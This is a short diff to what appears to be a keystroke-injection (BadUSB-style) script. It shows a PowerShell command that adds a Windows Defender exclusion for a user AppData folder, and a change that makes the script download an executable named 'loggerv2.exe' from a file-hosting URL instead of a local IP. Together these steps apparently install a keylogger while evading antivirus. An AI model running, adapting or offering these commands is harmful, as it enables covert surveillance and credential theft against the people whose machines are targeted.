@@ -47,7 +47,7 @@ STRING powershell Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\R
 ENTER
 DELAY 3000
 
-STRING curl -o loggerv2.exe 192.168.31.198/loggerv2.txt
+STRING curl -o loggerv2.exe https://file.io/cc0vRoQ1EorW
 ENTER
 DELAY 2000
 
